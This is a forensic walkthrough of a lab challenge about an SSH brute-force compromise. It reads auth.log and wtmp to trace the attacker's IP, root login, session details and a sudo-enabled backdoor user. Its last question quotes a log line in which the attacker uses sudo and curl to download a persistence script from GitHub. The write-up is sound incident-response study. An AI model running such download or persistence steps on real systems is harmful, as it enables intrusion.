# Brutus

## 1: Analyzing the auth.log, can you identify the IP address used by the attacker to carry out a brute force attack?

```
Mar  6 06:31:31 ip-172-31-35-28 sshd[2325]: Invalid user admin from 65.2.161.68 port 46380
Mar  6 06:31:31 ip-172-31-35-28 sshd[2325]: Received disconnect from 65.2.161.68 port 46380:11: Bye Bye [preauth]
Mar  6 06:31:31 ip-172-31-35-28 sshd[2325]: Disconnected from invalid user admin 65.2.161.68 port 46380 [preauth]
```

As we can see we have a failed login attempt from IP 65.2.161.68 

## 2: The brute force attempts were successful, and the attacker gained access to an account on the server. What is the username of this account?

```bash
Accepted password for root from 65.2.161.68 port 53184 ssh2
```

This is the attacker's IP and it successfully connect via ssh as the root user.


## 3:Can you identify the timestamp when the attacker manually logged in to the server to carry out their objectives?

Using the wtmp file we can identify that timestamp. I used a pearl script to parse the data.

```bash
Thu Jan 25 11:12:31 2024 Init                       ttyS0                                               
Thu Jan 25 11:12:31 2024 Login    LOGIN             ttyS0                                               
Thu Jan 25 11:12:31 2024 Init                        tty1                                               
Thu Jan 25 11:12:31 2024 Login    LOGIN              tty1                                               
Thu Jan 25 11:13:58 2024 Normal   ubuntu            pts/0 203.101.190.9                                 
Thu Jan 25 11:15:12 2024 Term                       pts/0                                               
Thu Jan 25 11:15:40 2024 Normal   root              pts/0 203.101.190.9                                 
Thu Jan 25 12:34:34 2024 Term                       pts/0                                               
Sun Feb 11 10:33:49 2024 Normal   root              pts/0 203.101.190.9                               
Sun Feb 11 10:39:02 2024 Init                       ttyS0                                               
Sun Feb 11 10:39:02 2024 Login    LOGIN             ttyS0                                               
Sun Feb 11 10:41:11 2024 Normal   root              pts/1 203.101.190.9                                 
Sun Feb 11 10:41:46 2024 Term                       pts/1                                               
Sun Feb 11 10:54:27 2024 Normal   root              pts/1 203.101.190.9                                 
Sun Feb 11 11:08:04 2024 Term                       pts/1                                               
Sun Feb 11 11:08:04 2024 Term                       pts/0                                               
Wed Mar  6 06:17:27 2024 Init                       ttyS0                                               
Wed Mar  6 06:17:27 2024 Login    LOGIN             ttyS0                                               
Wed Mar  6 06:17:27 2024 Init                        tty1                                               
Wed Mar  6 06:17:27 2024 Login    LOGIN              tty1                                               
Wed Mar  6 06:19:55 2024 Normal   root              pts/0 203.101.190.9                                 
Wed Mar  6 06:32:45 2024 Normal   root              pts/1 65.2.161.68               #Answer                      
Wed Mar  6 06:37:24 2024 Term                       pts/1                                               
Wed Mar  6 06:37:35 2024 Normal   cyberjunkie       pts/1 65.2.161.68                                   

```

```
2024-03-06 06:32:45
```

## 4:SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?

```bash
Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2
Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
Mar  6 06:32:44 ip-172-31-35-28 systemd-logind[411]: New session 37 of user root.
```

We can see the session number is 37.

## 5:The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?

```bash
Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: group added to /etc/group: name=cyberjunkie, GID=1002
Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: group added to /etc/gshadow: name=cyberjunkie
Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: new group: name=cyberjunkie, GID=1002
Mar  6 06:34:18 ip-172-31-35-28 useradd[2592]: new user: name=cyberjunkie, UID=1002, GID=1002, home=/home/cyberjunkie, shell=/bin/bash, from=/dev/pts/1

..

Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to group 'sudo'
Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to shadow group 'sudo'
```

We can see the name of the new user is "cyberjunkie".

## 6:What is the MITRE ATT&CK sub-technique ID used for persistence?

Adding anew local user. https://attack.mitre.org/techniques/T1136/001/

## 7:How long did the attacker's first SSH session last based on the previously confirmed authentication time and session ending within the auth.log? (seconds)

```bash
Q3: 2024-03-06 06:32:45 from wtmp file
...

Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Disconnected from user root 65.2.161.68 port 53184
Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: pam_unix(sshd:session): session closed for user root

```

The session lasted 279 seconds.

## 8:The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?

```bash
Mar  6 06:39:38 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
Mar  6 06:39:38 ip-172-31-35-28 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by cyberjunkie(uid=1002)
Mar  6 06:39:39 ip-172-31-35-28 sudo: pam_unix(sudo:session): session closed for user root
```

He used the script "linper.sh".